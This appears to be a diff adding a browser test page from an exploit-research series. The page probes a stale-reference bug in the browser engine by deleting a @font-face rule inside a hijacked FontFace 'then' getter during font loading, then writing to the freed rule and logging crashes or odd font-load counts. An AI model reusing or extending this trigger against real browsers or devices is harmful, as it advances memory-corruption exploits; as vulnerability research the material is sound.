@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 3 — Held rule write</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
+#status { font-size: 18px; margin-bottom: 8px; }
+#log { height: 70vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
+#t { font-family: x; font-size: 120px; color: #fff; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">held rule write probe...</div>
+<p style="color:#aaa;font-size:12px">05 showed heldRule.style.fontFamily write OK after deleteRule. Push that further.</p>
+<div id="log"></div>
+<div id="t">B</div>
+<script>
+(function () {
+    var logEl = document.getElementById('log');
+    var statusEl = document.getElementById('status');
+    window.ps4log = function (msg) {
+        var line = document.createElement('div');
+        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
+        logEl.appendChild(line);
+    };
+    window.ps4status = function (msg, color) {
+        statusEl.textContent = msg;
+        if (color) statusEl.style.color = color;
+    };
+})();
+
+function tryWrite(label, rule, prop, val) {
+    try {
+        rule.style[prop] = val;
+        ps4log(label + ': write ' + prop + '=' + val + ' OK, read=' + rule.style[prop]);
+    } catch (e) {
+        ps4log(label + ': write ' + prop + ' failed: ' + e);
+    }
+}
+
+window.onload = function () {
+    ps4log('Phase 3g — held rule write probe');
+    ps4log('UA: ' + navigator.userAgent);
+
+    var sheet = document.getElementById('s').sheet;
+    var heldRule = sheet.cssRules[0];
+
+    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+            if (!fired && this === A) {
+                fired = true;
+                ps4log('TRIGGER — deleteRule, keeping heldRule ref');
+                sheet.deleteRule(0);
+                ps4log('cssRules.length=' + sheet.cssRules.length);
+                document.body.offsetTop;
+            }
+            return undefined;
+        }
+    });
+
+    document.fonts.load('1em x', 'AB');
+
+    setTimeout(function () {
+        ps4log('--- writes to deleted heldRule ---');
+        tryWrite('w1', heldRule, 'fontFamily', 'z');
+        tryWrite('w2', heldRule, 'src', 'url(stale-write.woff)');
+        tryWrite('w3', heldRule, 'unicodeRange', 'U+0041');
+
+        ps4log('heldRule.cssText=' + heldRule.cssText.substring(0, 80));
+
+        ps4log('--- post-write state ---');
+        ps4log('check(A)=' + document.fonts.check('1em x', 'A'));
+        ps4log('check(B)=' + document.fonts.check('1em x', 'B'));
+        ps4log('check(AB)=' + document.fonts.check('1em x', 'AB'));
+
+        document.getElementById('t').textContent = 'AB';
+        ps4log('render AB offset=' + document.getElementById('t').offsetWidth);
+        document.getElementById('t').textContent = 'B';
+        ps4log('render B offset=' + document.getElementById('t').offsetWidth);
+
+        document.fonts.load('1em x', 'AB').then(function (f) {
+            ps4log('post-write load(AB) count=' + f.length);
+        }).catch(function (e) {
+            ps4log('post-write load(AB) err=' + e);
+        });
+
+        document.fonts.load('1em x', 'B').then(function (f) {
+            ps4log('post-write load(B) count=' + f.length);
+        }).catch(function (e) {
+            ps4log('post-write load(B) err=' + e);
+        });
+
+        ps4status('done — check for crash or weird load counts', '#0f0');
+    }, 500);
+};
+</script>
+</body>
+</html>
